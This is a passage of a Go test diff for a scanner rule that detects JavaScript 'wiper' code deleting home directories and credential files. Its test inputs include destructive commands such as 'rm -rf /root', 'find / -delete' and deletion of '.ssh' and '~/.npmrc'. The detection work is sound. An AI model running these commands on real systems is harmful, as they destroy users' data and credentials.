+			name:    "fs.promises namespace rmSync does not exist",
+			content: "const fs = require('fs');\nfs.promises.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 4 P2: { promises: fsp } rename, then a *Sync method.
+			name:    "destructured promises rename rmSync does not exist",
+			content: "const { promises: fsp } = require('fs');\nfsp.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 4 positive: the async fs/promises rm DOES exist and
+			// deletes the directory.
+			name:    "fs/promises alias rm (async) -> HIGH",
+			content: "const fs = require('fs/promises');\nfs.rm('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 4 positive: an ABSOLUTE home prefix still anchors a
+			// project-capable file.
+			name:    "absolute /home/dev/.npmrc is home-anchored -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/dev/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 5 P2: a *Sync local destructured from fs/promises does
+			// not exist (fs/promises is async-only).
+			name:    "destructured { rmSync } from fs/promises does not exist",
+			content: "const { rmSync } = require('fs/promises');\nrmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 5 P2 positive: the async { rm } destructure DOES exist.
+			name:    "destructured { rm } from fs/promises (async) -> HIGH",
+			content: "const { rm } = require('fs/promises');\nrm('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 5 P2: an UNFILTERED find -delete wipes the whole root,
+			// so find $HOME -delete is a broad home wipe -> CRITICAL.
+			name:    "shell find $HOME -delete unfiltered broad wipe -> CRITICAL",
+			content: "require('child_process').execSync('find $HOME -delete');\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 5 P2: find / -delete is a root wipe.
+			name:    "shell find / -delete unfiltered root wipe -> CRITICAL",
+			content: "require('child_process').execSync('find / -delete');\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 5: a FILTERED find narrows the delete to matched
+			// files, so the broad root is not itself a wipe.
+			name:    "shell find $HOME -name '*.log' -delete is filtered, not a broad wipe",
+			content: "require('child_process').execSync('find $HOME -name \"*.log\" -delete');\n",
+			want:    false,
+		},
+		{
+			// review round 5 P2: a `$HOME`/`~` past the first token char is not a
+			// home anchor; the path is relative.
+			name:    "shell rm -f build$HOME/.npmrc is not home-anchored",
+			content: "require('child_process').execSync('rm -f build$HOME/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// review round 5 P2: same for a `~` mid-token.
+			name:    "shell rm -f foo~/.npmrc is not home-anchored",
+			content: "require('child_process').execSync('rm -f foo~/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// review round 5 positive: a real ~-anchored credential file fires.
+			name:    "shell rm ~/.npmrc (home-anchored file) -> HIGH",
+			content: "require('child_process').execSync('rm ~/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 6 P2: a combined fs/promises import records the
+			// default alias as promises-only, so its *Sync method does not exist.
+			name:    "combined import fsp, { rm } from fs/promises -> rmSync does not exist",
+			content: "import fsp, { rm } from 'node:fs/promises';\nfsp.rmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 6 positive: the async rm on the combined-import alias
+			// DOES exist.
+			name:    "combined import fsp from fs/promises -> fsp.rm (async) -> HIGH",
+			content: "import fsp, { stat } from 'fs/promises';\nfsp.rm('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// review round 7 P2: /root is root's home dir (common when hooks run
+			// as root in containers/CI), so a recursive wipe is CRITICAL.
+			name:    "fs.rmSync('/root', { recursive: true }) wipes root's home -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync('/root', { recursive: true });\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 7 P2: shell rm -rf /root broad wipe.
+			name:    "shell rm -rf /root broad wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /root');\n",
+			want:    true,
+			crit:    true,
+		},
+		{
+			// review round 7 P2: a file under /root is home-anchored.
+			name:    "fs.unlinkSync('/root/.npmrc') is home-anchored -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('/root/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// review round 7 boundary: /rootkit is not /root.
+			name:    "shell rm -rf /rootkit is not a home wipe",
+			content: "require('child_process').execSync('rm -rf /rootkit');\n",
+			want:    false,
+		},
+		{
+			// review round 8 P2: a combined import naming a *Sync method
+			// (`import fsp, { rmSync } from 'fs/promises'`) is still promises-only,
+			// so the method does not exist.
+			name:    "combined import { rmSync } from fs/promises does not exist",
+			content: "import fsp, { rmSync } from 'fs/promises';\nrmSync('.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// review round 8 P2: a nested recursive:true under a top-level
+			// recursive:false does not enable Node's recursive removal.
+			name:    "nested recursive:true under top-level false cannot remove a directory",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: false, retry: { recursive: true } });\n",
+			want:    false,
+		},
+		{
+			// review round 8 positive: a top-level recursive:true alongside a
+			// nested object still fires.
+			name:    "top-level recursive:true with a nested object -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true, retry: { x: 1 } });\n",
+			want:    true,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			findings := analyze(t, "index.js", c.content)
+			got := hasRule(findings, RuleWiperTripwire)
+			if got != c.want {
+				t.Fatalf("JS_WIPER_TRIPWIRE_001 present = %v, want %v (findings: %+v)", got, c.want, findings)
+			}
+			if c.want {
+				f := findRule(findings, RuleWiperTripwire)
+				if c.crit && f.Severity != types.SeverityCritical {
+					t.Errorf("expected CRITICAL, got %+v", f)
+				}
+				if !c.crit && f.Severity != types.SeverityHigh {
+					t.Errorf("expected HIGH, got %+v", f)
+				}
+			}
+		})
+	}
+}
